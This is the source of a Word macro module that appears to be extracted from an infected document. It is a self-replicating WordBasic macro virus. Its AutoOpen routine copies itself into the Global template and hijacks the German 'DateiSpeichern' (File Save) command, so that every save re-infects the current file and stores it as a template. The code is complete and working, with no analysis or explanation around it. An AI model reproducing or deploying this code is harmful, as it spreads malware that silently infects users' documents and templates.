   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Makrone", "Global:DateiSpeichern"
   End Sub

   Attribute VB_Name = "Makrone"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Makrone.MAIN"
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:DateiSpeichern", WordBasic.[FileName$]() + ":Makrone"
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   End Sub
